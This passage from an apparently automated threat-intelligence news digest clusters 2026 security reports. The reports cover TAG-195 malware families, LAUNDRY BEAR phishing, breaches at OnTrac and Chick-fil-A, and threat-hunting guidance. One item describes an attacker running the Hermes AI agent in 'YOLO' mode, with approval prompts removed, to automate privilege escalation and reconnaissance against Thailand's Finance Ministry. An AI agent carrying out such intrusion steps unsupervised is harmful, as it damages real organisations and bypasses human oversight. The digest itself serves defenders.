TAG-195 Upgrades MaaS Ecosystem with Modular Tools Executive Summary Insikt Group identified four new TAG-195 ("Golden Chickens", “Venom Spider”) malware families through ongoing tracking of the TAG-195 MaaS ecosystem. We named two of the families "TinyEgg" and “ChonkyChicken"; the third is a modularized variant of ChonkyChicken. The fourth family, which includes a modified browser credential theft helper, we named “ChromEggscalator". TAG-195 is a financially motivated malware-as-a-service (MaaS) developer whose tooling Insikt Group has previously linked to TAG-127 as an operator and customer. (Insikt Group has directly observed TAG-127 deploying TinyEgg via “ClickFix”-style campaigns that use fake security verification pages to trick victims into manually executing malicious commands that download and install malware payloads via a legitimate Windows system utility.) The four new families indicate an architectural transition and evolution in the TAG-195 MaaS ecosystem. TinyEgg is a lightweight initial-access backdoor providing host profiling, interactive shell access, and persistence management. ChonkyChicken substantially expands that capability with browser credential theft, browser session automation, credential-backed remote execution, network reconnaissance, and sustained surveillance. The modularized ChonkyChicken extends this design by introducing a controller-and-plugin architecture in which a base controller implant requests and loads discrete capability modules from attacker-controlled infrastructure on demand rather than embedding all functionality in the implant itself. TAG-195 also modified a publicly available Chrome encryption-bypass tool into a custom helper within the malware family that Insikt Group named ChromEggscalator. All four families share a common set of architectural traits: consistent command-and-control mechanisms, a shared persistence approach, string obfuscation, and execution via the same delivery model. Insikt Group assesses that TAG-195’s transition to a modular architecture almost certainly reduces the base implant's static detection exposure, and likely also reflects commercial incentives inherent to the MaaS model, including the ability to provision capabilities selectively to operators, limit exposure if a customer is compromised, and serve a broader range of operational requirements. Defenders should prioritize detection of ClickFix-style clipboard execution chains, misuse of legitimate system utilities to load payloads from user-writable directories, suspicious startup persistence mechanisms, browser processes launched with remote debugging enabled, and unusual outbound communications to attacker-controlled infrastructure. Key Findings Insikt Group identified four new TAG-195 malware families through its continued tracking of the TAG-195 MaaS ecosystem: TinyEgg, ChonkyChicken, a modularized variant of ChonkyChicken, and ChromEggscalator. Their identification indicates sustained active development and a deliberate architectural transition toward modular, operator-driven tooling. The modularized ChonkyChicken variant uses a controller-and-plugin architecture in which a base controller implant requests and loads at least fourteen capability modules on demand. Insikt Group assesses that this design almost certainly reduces the base implant's static detection footprint while enabling operators to deploy only what each intrusion requires. All four malware families share four recurring architectural traits that indicate their origin within the same TAG-195 development ecosystem: filename execution gating, Run key persistence under a consistent value name, string obfuscation, and execution via a legitimate Windows binary. Background TAG-195, also known as “Golden Chickens” or "Venom Spider", is a financially motivated MaaS developer with a long-standing history of providing credential theft and remote access tooling to criminal operators. Insikt Group assesses TAG-195 as a MaaS provider based o
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: TAG-195 Upgrades MaaS Ecosystem with Modular Tools
  - Published: 2026-07-23T00:00:00+00:00
  - Link: https://www.recordedfuture.com/research/tag-195-evolves-maas-ecosystem
  - Summary: Insikt Group identifies four new TAG-195 malware families, revealing an architectural transition toward modular, operator-driven tooling in the MaaS ecosystem

### Cluster 0ebaf42c3e — score 10

- Title: Modern Attack Vectors | Recorded Future
- Source: Recorded Future (threat_research_primary)
- Published: 2026-07-22T00:00:00+00:00
- Link: https://www.recordedfuture.com/blog/modern-attack-vectors
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, phishing_social_eng, ransomware_extortion, supply_chain, zero_day
- urgency_signals: no_patch_yet, zero_day
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, credential_theft, zero_day
- urgency_signals: zero_day, no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
What is an attack vector, and how does it impact your business? Discover the top threat actor targets in 2026 and learn attack vector vs attack surface dynamics.
```

#### Full body

```
Mapping Modern Attack Vectors: What Threat Actors Are Targeting in 2026 Key Takeaways Modern threat actors have shifted from brute-forcing firewalls to compromising digital identities via stolen session cookies and credential stuffing to bypass MFA entirely Adversaries increasingly target unpatched edge infrastructure like VPNs for zero-day access while exploiting open-source repositories to launch upstream supply chain attacks Traditional internal security telemetry may miss critical pre-attack signals, making real-time, outside-in threat intelligence essential to neutralizing modern vectors before a breach occurs For today’s Chief Information Security Officers (CISOs) and security team leaders, defending your business can feel like trying to hold back the ocean. As organizations rapidly scale cloud-native infrastructure, integrate sprawling third-party ecosystems, and adopt enterprise AI workflows, most organizations' digital footprints have exploded. But a massive digital footprint isn’t the core problem. The problem is that adversaries are changing how they navigate it. Advanced persistent threats (APTs) and sophisticated cybercriminal syndicates are no longer relying on blunt-force intrusions. Instead, they are tracking organizational vulnerabilities from the outside in , using targeted methods to slip past defenses unnoticed. To stay ahead, security leaders must look past traditional, inward-facing security telemetry and think more like the adversary. That begins with a precise, real-time understanding of modern attack vectors. What is an Attack Vector? In cybersecurity, an attack vector is the specific path, route, or method an adversary uses to gain unauthorized access to a network, system, or endpoint to deliver a malicious payload or extract data. If an exploit is the lockpick, the attack vector is the hallway the intruder walked down to reach the door. Historically, attack vectors were relatively straightforward. A decade ago, an enterprise might primarily worry about phishing emails containing malicious executable attachments or unpatched, internet-facing servers. In 2026, attack vectors have evolved from isolated incidents into complex, multi-stage journeys. Modern adversaries rarely rely on a single open door. Instead, they link multiple vectors together to achieve their objectives. For example, a modern threat actor might initiate an intrusion using an automated multi-factor authentication (MFA) fatigue campaign to compromise a low-level employee identity, pivot through an exposed, undocumented API, and ultimately execute a ransomware payload via a trusted third-party software update. Attack Vector vs. Attack Surface: What’s the Difference? While they are frequently used interchangeably in security discussions, conflating your attack vectors with your attack surface can create fundamental gaps in your defensive strategy. An Attack Surface is the sum total of all potential vulnerabilities, exposure points, and digital assets across an organization’s entire footprint that an unauthorized user could try to enter or extract data from—including public cloud buckets, employee credentials, IoT devices, code repositories, and vendor networks. An Attack Vector is the specific vehicle, mechanism, or strategy used to exploit a precise point on that surface. It is the active "weapon" or method of transit chosen by the hacker. Think of your organization as a fortified castle . The attack surface is the entirety of the castle's physical structure—every wall, window, gate, and underground passage. The attack vector is the specific ladder, battering ram, or sleeping guard the invading army uses to breach a specific point on that structure. Defending the attack surface requires comprehensive visibility into what you own. Neutralizing an attack vector requires real-time intelligence on how adversaries are actively weaponizing their toolkits. What Threat Actors Are Actively Targeting in 2026 Adversary tactics are driven by efficie
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: Modern Attack Vectors | Recorded Future
  - Published: 2026-07-22T00:00:00+00:00
  - Link: https://www.recordedfuture.com/blog/modern-attack-vectors
  - Summary: What is an attack vector, and how does it impact your business? Discover the top threat actor targets in 2026 and learn attack vector vs attack surface dynamics.

### Cluster eeab7cc5f2 — score 10

- Title: Threat Hunting: A Guide | Recorded Future
- Source: Recorded Future (threat_research_primary)
- Published: 2026-07-20T00:00:00+00:00
- Link: https://www.recordedfuture.com/blog/cyber-threat-hunting
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: apt_espionage
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Master modern cyber threat hunting by embracing real-time threat intelligence. Discover the elite tools, steps, and frameworks to expose hidden adversaries.
```

#### Full body

```
Using Threat Intelligence to Master Modern Threat Hunting Enterprise security architectures have never been more heavily funded, yet the perimeter is functionally obsolete . Despite multi-million dollar investments in next-generation firewalls and complex defense stacks, sophisticated adversaries slip past automated boundaries every day. They don't break in; they log in, embedding themselves silently into the background noise of normal business operations. To survive in this environment, modern cyber defense teams must anchor their strategy to a single, non-negotiable rule: Assume you are already breached. Waiting for an automated alert to trigger is a losing strategy. Proactive cyber threat hunting shifts the power dynamic from reactive firefighting to active, aggressive detection. Human analysts alone cannot process the volume and velocity of data required to detect sophisticated adversaries at enterprise scale. To truly master modern threat hunting, security teams should consider enriching internal telemetry with real-time, external threat intelligence. Understanding threat hunting At its core, threat hunting is the practice of proactively and iteratively searching networks, endpoints, and cloud environments to detect and isolate advanced threats that evade existing security solutions. It is a human-led, hypothesis-driven discipline—not a purely automated feature of a software suite. Here is how it differs from other standard security functions: Threat Hunting vs. Incident Response Incident response is fundamentally reactive; it is the act of extinguishing an active, visible fire after an alert has triggered. Threat hunting is proactive, searching the architecture for hidden threats before they erupt into a catastrophic breach. Threat Hunting vs. Penetration Testing Penetration testing evaluates perimeter defenses from the outside in, evaluating whether a simulated adversary can breach the network. Threat hunting operates under the explicit assumption that the attacker is already firmly rooted inside, hunting them down from within. Threat Hunting vs. Vulnerability Assessments Vulnerability management focuses on patching open windows and updating code to prevent future exploitation. Threat hunting assumes an attacker has already gained access and focuses on detecting their lateral movement before damage is done. What teams need to begin threat hunting An effective threat hunt cannot begin in a vacuum. Before analysts can root out sophisticated threat actors, organizations must establish a baseline foundation across three core pillars: visibility, integration, and external context. 1. Visibility Threat hunting requires deep, centralized internal telemetry logs, including: Endpoint Event Logs (EDR Data) : Process execution trees, registry modifications, and local network connections. Network Traffic Analysis (NTA) : NetFlow data, DNS queries, and TLS handshake anomalies. Identity & Access Management (IAM) Logs : Cross-zone authentication spikes, anomalous MFA prompts, and privilege escalations. 2. Tool integration Relying on isolated data silos paralyzes analysts. Security teams are recommended to leverage unified SIEM and SOAR integrations to aggregate disparate data sets, normalize log schemas, and eliminate the white noise of benign network activity. 3. External intelligence Analyzing internal logs without external context is like looking at footprints in the mud without knowing what animal made them. Deep web, dark web, and technical intelligence should be required, providing the exact behavioral profiles, infrastructure layouts, and campaign contexts needed to guide the hunt. The 3 Core threat hunting methodologies 1. Hypothesis-Driven Hunting This methodology relies on a baseline understanding of an organization's unique threat profile. Rather than chasing random anomalies, hunters form educated, structured theories based on environmental risk. For example: "If an advanced persistent threat (APT) targets our specific fin
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: Threat Hunting: A Guide | Recorded Future
  - Published: 2026-07-20T00:00:00+00:00
  - Link: https://www.recordedfuture.com/blog/cyber-threat-hunting
  - Summary: Master modern cyber threat hunting by embracing real-time threat intelligence. Discover the elite tools, steps, and frameworks to expose hidden adversaries.

### Cluster 574ebfebeb — score 9

- Title: UK and partners expose Russian state-supported actors for new ‘zero-click’ phishing campaign targeting Western organisations
- Source: NCSC UK (government_authoritative)
- Published: 2026-07-23T12:00:00+00:00
- Link: https://www.ncsc.gov.uk/news/uk-and-partners-expose-russian-state-supported-actors-for-new-zero-click-phishing-campaign
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng
- affected_industries: critical_infrastructure, education, government
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- threat_categories: phishing_social_eng, apt_espionage
- affected_industries: government, critical_infrastructure, education
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
GCHQ’s National Cyber Security Centre and international partners issue warning as ‘LAUNDRY BEAR’ cyber threat group exposed for targeted phishing campaign
```

#### Full body

```
News Download & print article PDF Download & print article PDF UK and partners expose Russian state-supported actors for new ‘zero-click’ phishing campaign targeting Western organisations GCHQ’s National Cyber Security Centre and international partners issue warning as ‘LAUNDRY BEAR’ cyber threat group exposed for targeted phishing campaign Russian state-supported actors develop new technique to target Western email platforms and gain persistent access to compromised networks Organisations provided with trusted advice and support to protect sensitive data in the face of evolving cyber threats Russian state-supported cyber actors have targeted Western organisations with a malicious campaign which uses a zero-click exploit coined “beehive” (or “ Ulej ”) to steal emails, the UK has warned. Today, the National Cyber Security Centre – a part of GCHQ – alongside cyber security agencies in 15 countries, has exposed activities of LAUNDRY BEAR, an advanced persistent threat group who specialise in the covert acquisition of email data. Since July 2025, LAUNDRY BEAR has successfully targeted and stolen sensitive email information from organisations that use Zimbra Collaboration Suite (ZCS) software. US organisations have been targeted in sectors including defence, government, education, energy, law enforcement, media, NGOs and technology. In a new joint advisory , the NCSC and partners warn LAUNDRY BEAR’s ongoing campaign is indicative of espionage and almost certainly carried out with Russian state support. Unlike traditional phishing campaigns, “beehive” allows the threat actors to gain extensive and sustained access to emails without requiring a user’s input. Instead of clicking a link or opening a file, the user only has to view a malicious email within a vulnerable version of the ZCS webmail service to be compromised. Organisations that use ZCS are urged to follow the mitigation advice, including to immediately patch vulnerabilities and improve network monitoring capabilities. The cyber agencies caution that it is likely “beehive” could be adapted to exploit other vulnerabilities. As more organisations update their ZCS software, it is very likely that the group will also look to target other email systems that Western organisations use. The NCSC recommends all UK organisations should sign up to the free Early Warning service for malicious network activity notifications. The government is committed to raising cyber resilience across the UK to protect businesses and safeguard growth. Earlier this month, businesses from every corner of the British economy joined a pledge publicly committing to strengthen their defences in the face of a fast-evolving threat. Today’s action shows we’re working hand-in-hand with our allies to expose Russian state-supported hackers targeting Western organisations. It’s particularly concerning that these thugs tested their methods on victims in Ukraine, before targeting members of NATO. Organisations across the UK should sign up to NCSC’s Early Warning service to ensure they can quickly secure their systems against similar activity. Security Minister, Dan Jarvis MBE This phishing campaign demonstrates how hostile actors will ruthlessly adapt techniques and exploit vulnerable technology in pursuit of their aims to steal sensitive information from Western organisations. With our international partners, we strongly encourage organisations to familiarise themselves with the ‘zero-click’ techniques described in the advisory which could be used against other platforms, and act on the mitigation advice. We will continue to call out malicious cyber activity supported by the Russian state and urge everyone to follow NCSC guidance to raise resilience, including steps to strengthen online account security. Beth Hopkins CMG, NCSC Chief Operating Officer The advisory highlights how these malicious cyber techniques were extensively trialled on Ukrainian victims before use against members of NATO, which is part of a growi
```

#### Corroborating sources (1)

- **NCSC UK** (government_authoritative)
  - Title: UK and partners expose Russian state-supported actors for new ‘zero-click’ phishing campaign targeting Western organisations
  - Published: 2026-07-23T12:00:00+00:00
  - Link: https://www.ncsc.gov.uk/news/uk-and-partners-expose-russian-state-supported-actors-for-new-zero-click-phishing-campaign
  - Summary: GCHQ’s National Cyber Security Centre and international partners issue warning as ‘LAUNDRY BEAR’ cyber threat group exposed for targeted phishing campaign

### Cluster 57268d1ce0 — score 9

- Title: When the "Autonomous Attacker" Is Your Own AI Model, (Thu, Jul 23rd)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-07-23T13:40:27+00:00
- Link: https://isc.sans.edu/diary/rss/33180
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
Two disclosures, five days apart, described the same intrusion from opposite ends â€” one from the victim, one from the party that turned out to be responsible â€” and together they make one of the more instructive incidents of the year for defenders.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: When the "Autonomous Attacker" Is Your Own AI Model, (Thu, Jul 23rd)
  - Published: 2026-07-23T13:40:27+00:00
  - Link: https://isc.sans.edu/diary/rss/33180
  - Summary: Two disclosures, five days apart, described the same intrusion from opposite ends â€” one from the victim, one from the party that turned out to be responsible â€” and together they make one of the more instructive incidents of the year for defenders.

### Cluster 8fec99ded9 — score 9

- Title: Rondo Meets Geoserver, (Wed, Jul 22nd)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-07-22T17:35:33+00:00
- Link: https://isc.sans.edu/diary/rss/33176
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
This isn&#;x26;#;39;t a new attack, but something I saw "pop-up" in our logs this week:
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Rondo Meets Geoserver, (Wed, Jul 22nd)
  - Published: 2026-07-22T17:35:33+00:00
  - Link: https://isc.sans.edu/diary/rss/33176
  - Summary: This isn&#;x26;#;39;t a new attack, but something I saw "pop-up" in our logs this week:

### Cluster 6e646120d9 — score 9

- Title: Captive Portal Detection, (Tue, Jul 21st)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-07-21T13:44:56+00:00
- Link: https://isc.sans.edu/diary/rss/33172
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
Not everything our honeypots detect is an attack. Sometimes it is just "odd traffic", and this is one example: Our "First Seen" list currently includes "http://detectportal.firefox.co m/success.txt" as one of the new URLs detected by our honeypots. The hostname "detectportal" kind of gives away what is happening here.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Captive Portal Detection, (Tue, Jul 21st)
  - Published: 2026-07-21T13:44:56+00:00
  - Link: https://isc.sans.edu/diary/rss/33172
  - Summary: Not everything our honeypots detect is an attack. Sometimes it is just "odd traffic", and this is one example: Our "First Seen" list currently includes "http://detectportal.firefox.co m/success.txt" as one of the new URLs detected by our honeypots. The hostname "detectportal" kind of gives away what is happening here.

### Cluster c715bd520f — score 9

- Title: Scans for Hikvision Intelligent Security API, (Sun, Jul 19th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-07-19T15:00:38+00:00
- Link: https://isc.sans.edu/diary/rss/33164
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
We have been following issues with Hikvision cameras for a long, long time . Like many similar products, Hikvision cameras have a long history of vulnerabilities and are often targeted by internet-wide scans that our honeypot network detects.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Scans for Hikvision Intelligent Security API, (Sun, Jul 19th)
  - Published: 2026-07-19T15:00:38+00:00
  - Link: https://isc.sans.edu/diary/rss/33164
  - Summary: We have been following issues with Hikvision cameras for a long, long time . Like many similar products, Hikvision cameras have a long history of vulnerabilities and are often targeted by internet-wide scans that our honeypot network detects.

### Cluster 5ef02eeb29 — score 9

- Title: OnTrac notifies customers of data breach after network hack
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-07-24T19:55:01+00:00
- Link: https://www.bleepingcomputer.com/news/security/ontrac-notifies-customers-of-data-breach-after-network-hack/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion, supply_chain
- actor_attribution: ShinyHunters
- affected_industries: retail_ecommerce
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, data_breach
- actor_attribution: ShinyHunters
- affected_industries: retail_ecommerce
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
OnTrac parcel delivery company is informing that hackers breached its corporate network and may have accessed personal details belonging to its customers. [...]
```

#### Full body

```
OnTrac notifies customers of data breach after network hack By Bill Toulas July 24, 2026 03:55 PM 0 OnTrac parcel delivery company is informing that hackers breached its corporate network and may have accessed personal details belonging to its customers. The incident was detected on March 23, and an internal investigation revealed that the attacker accessed certain files between March 20 and 22. Apart from names, it is unclear what type of information was exposed, as the company redacted the data elements in the notification sample shared with authorities. OnTrac is a private American parcel-delivery company specializing in “last-mile” e-commerce deliveries, formed in 2021 from the merger of OnTrac Logistics and LaserShip. The firm operates at 102 locations across 35 states , covering roughly 70% of the U.S. population, and working with more than 7,000 independent delivery contractors. In response to the security incident, OnTrac contracted a third-party specialist to help determine the scope of the breach and took steps to “ensure the data described above was re-secured and not distributed.” This statement suggests a possible agreement between the firm and the attackers, typically a ransom payment, to make sure that the customer information is not leaked. "We are not aware of any fraud or publication of stolen information resulting from this incident, nor do we have any reason to believe any such misuse of information will occur," OnTrac says in the notification. To help exposed customers mitigate the risks that may arise from the exposure of their sensitive data, OnTrac is offering free-of-charge access to a 12-month credit monitoring and identity protection service via CyberScout, with a 90-day enrollment deadline. Recipients of the letter are also recommended to review their credit reports and account statements, and consider placing a free fraud alert or credit freeze if the risk is deemed significant. BleepingComputer has contacted OnTrac to learn more about the attack, the number of impacted clients, and whether a ransom was paid, but we have not heard back by publication time. At the time of writing, no ransomware or data extortion threat groups have taken responsibility for the attack. Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: Ernst & Young discloses data breach after support system hack Healthtech firm Xolis suffers data breach impacting 1.4 million people Upbound says hack caused $13 million in fraudulent Acima leases Medtronic notifies customers impacted by ShinyHunters data breach LastPass confirms data breach in Klue supply chain attack
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: OnTrac notifies customers of data breach after network hack
  - Published: 2026-07-24T19:55:01+00:00
  - Link: https://www.bleepingcomputer.com/news/security/ontrac-notifies-customers-of-data-breach-after-network-hack/
  - Summary: OnTrac parcel delivery company is informing that hackers breached its corporate network and may have accessed personal details belonging to its customers. [...]

### Cluster 8134ede9bf — score 9

- Title: Hermes AI agent used to automate attack on Thai Finance Ministry
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-07-24T19:09:09+00:00
- Link: https://www.bleepingcomputer.com/news/security/hermes-ai-agent-used-to-automate-attack-on-thai-finance-ministry/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- affected_industries: financial_services
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: web_shell_backdoor
- affected_industries: financial_services
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
A threat actor used the open-source Hermes AI agent in unattended "YOLO" mode to automate post-exploitation activity during an alleged breach of Thailand's Ministry of Finance. [...]
```

#### Full body

```
Hermes AI agent used to automate attack on Thai Finance Ministry By Lawrence Abrams July 24, 2026 03:09 PM 0 A threat actor used the open-source Hermes AI agent in unattended "YOLO" mode to automate post-exploitation activity during an alleged breach of Thailand's Ministry of Finance. The activity was uncovered by threat intelligence company Hunt.io and security researcher Bob Diachenko after they discovered several exposed web directories containing hundreds of files associated with the operation. Hunt.io says session files, deployed web shells, and evidence of access to internal systems indicate that the attackers compromised multiple systems within the ministry's network. However, the Ministry of Finance has not confirmed that its systems were breached, and some of the recovered artifacts only show that particular systems were targeted rather than successfully compromised. BleepingComputer contacted Thailand's Ministry of Finance and ThaiCERT to confirm the reported attack and will update this story if we receive a response. Attack infrastructure exposed online Between July 9 and July 13, Hunt.io discovered three simultaneously exposed directories on a server hosted in Hong Kong. The directories contained 585 files totaling approximately 470 MB, including exploit code, web shells, HTTP tunneling tools, custom scripts, stolen credentials, compiled payloads, and logs generated by the Hermes AI agent. The recovered files referenced Ministry of Finance systems by name, hostname, and internal IP address, and included scripts targeting internal services. Some scripts targeted the ministry's Hadoop infrastructure, Apache Ambari management platform, GlassFish administrative console, and an administrative web panel. Other scripts tested authentication against ministry mail servers using hardcoded email addresses and passwords. Hunt.io also found a PHP web shell that it says had been deployed on a Ministry of Finance web server. The researchers linked the initial server to additional attacker-controlled infrastructure by shared TLS certificates used during the same time period. "In addition to the common name, all these certificates share a JA4X fingerprint, a hash derived from the structure of the certificate itself rather than its contents," explained Hunt's report. "Querying that hash alongside the www common name in HuntSQL returned two additional, related hosts: 118.107.222[.]232 (The Gigabit, Malaysia) and 202.181.27[.]115 (Converged Communications Limited, Hong Kong)." One of those servers was later linked to the operation through a command-and-control address embedded in a recovered implant. The directories also contained Windows and Linux builds of a previously undocumented Go-based implant that the operator called Hades. However, the more interesting discovery was a collection of logs showing that the attackers used an AI agent, Hermes , to automate parts of the cyberattack against the ministry. Hermes operating in YOLO mode Hermes is an open-source AI agent released in February 2026 that runs as a persistent service and can remember information between different task sessions. The AI agent can interact with tools and execute commands while working on tasks provided by the operator. The software includes a setting known as YOLO mode , which removes prompts that would require a person to approve dangerous commands. The researchers were able to recover environment information and Hermes output logs from the exposed directories that showed the operator had enabled this unattended mode. This allowed the agent to execute commands and continue analyzing systems without waiting for human approval at each step. Five recovered Hermes call logs show the agent was used to find a way to elevate privileges, scan for kernel vulnerabilities, enumerate services, search for SUID and SGID binaries, inspect containers, and traverse file systems. Hermes was also told to use a customized version of the LinPEAS privilege-escalation enumeration s
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Hermes AI agent used to automate attack on Thai Finance Ministry
  - Published: 2026-07-24T19:09:09+00:00
  - Link: https://www.bleepingcomputer.com/news/security/hermes-ai-agent-used-to-automate-attack-on-thai-finance-ministry/
  - Summary: A threat actor used the open-source Hermes AI agent in unattended "YOLO" mode to automate post-exploitation activity during an alleged breach of Thailand's Ministry of Finance. [...]

### Cluster d3be89f12a — score 9

- Title: Chick-fil-A data breach affects more than 13,000 customers
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-07-24T14:04:29+00:00
- Link: https://www.bleepingcomputer.com/news/security/chick-fil-a-data-breach-affects-more-than-13-000-customers/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: credential_theft, data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Chick-fil-A has confirmed that over 13,000 customers had their accounts breached in a wave of credential stuffing attacks targeting its website and mobile app between June 17 and June 19. [...]
```

#### Full body

```
Chick-fil-A data breach affects more than 13,000 customers By Sergiu Gatlan July 24, 2026 10:04 AM 0 American fast food restaurant chain Chick-fil-A has confirmed that over 13,000 customers had their data stolen in a recent wave of credential stuffing attacks. As BleepingComputer first reported , the company revealed in data breach notification letters filed with multiple attorney general's offices that it detected attacks targeting its website and mobile app between June 17 and June 19 after identifying suspicious login activity to certain Chick-fil-A One accounts. Chick-fil-A says the attackers used automated tools and credentials "obtained from a third-party source" to hack into Chick-fil-A One accounts and steal customer data. "We recently identified a security incident that may have affected a limited number of Chick-fil-A One Loyalty accounts. Upon discovering the issue, we took steps to immediately address, secure and restore accounts, and we are communicating directly with all customers who may have been impacted," the company told BleepingComputer. During the attacks, the threat actors accessed a combination of customers' names, email addresses, Chick-fil-A One membership numbers, the amount of Chick-fil-A credit, the mobile pay numbers, and the last four digits of the credit/debit card number. Additionally, they may have also gained access to birth dates, phone numbers, and addresses if stored in the compromised accounts. While the company didn't say how many individuals had their data exposed, Chick-fil-A notes in a filing shared by the Office of the Maine Attorney General with BleepingComputer on Wednesday that the resulting data breach affected 13,322 people in total. In separate filings, it also told the Texas attorney general's office the data breach impacts 2182 Texans and the Massachusetts AG that it affects 39 residents . Chick-fil-A has also sent data breach notification letters to residents of the District of Columbia, Iowa, Maryland, New Mexico, New York, North Carolina, Oregon, Vermont, and Rhode Island. In response to the incident, Chick-fil-A says it logged out all impacted accounts, removed payment methods, restored all affected Chick-fil-A One account balances, and has also added rewards to affected accounts as a way of apologizing. Since the accounts were compromised because they were using credentials stolen from third-party services, Chick-fil-A also advised impacted customers to change their passwords as soon as possible. Chick-fil-A also disclosed in March 2023 that hackers stole the personal information of over 71,000 customers after hacking their accounts in another series of credential stuffing attacks between December 2022 and February 2023. As one of the largest fast food companies in the United States, Chick-fil-A operates a network of over 3,000 restaurants across the U.S., Canada, Puerto Rico, the United Kingdom, and Singapore. Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: Chick-fil-A discloses data breach after credential stuffing attacks AssuranceAmerica data breach exposes records of 6.9 million drivers 23andMe to pay $18 million in new genetics data breach settlement Lidl discloses online shop breach after service provider hack DHS confirms hackers breached HSIN info-sharing platform
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Chick-fil-A data breach affects more than 13,000 customers
  - Published: 2026-07-24T14:04:29+00:00
  - Link: https://www.bleepingcomputer.com/news/security/chick-fil-a-data-breach-affects-more-than-13-000-customers/
  - Summary: Chick-fil-A has confirmed that over 13,000 customers had their accounts breached in a wave of credential stuffing attacks targeting its website and mobile app between June 17 and June 19. [...]

### Cluster 86bb601c47 — score 8

- Title: The New Hotness in Phishing: Device Code Attacks in M365
- Source: TrustedSec (detection_response_operations)
- Published: 2026-07-21T04:00:00+00:00
- Link: https://trustedsec.com/blog/the-new-hotness-in-phishing-device-code-attacks-in-m365
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_products: Microsoft Entra
- tools_used: Microsoft 365
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_products: Microsoft Entra
- tools_used: Microsoft 365
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
<p>Device code phishing is quietly becoming one of the more effective techniques targeting M365 environments. In this blog, we detail how it works and the Conditional Access controls that shut it down.</p>
```

#### Full body

```
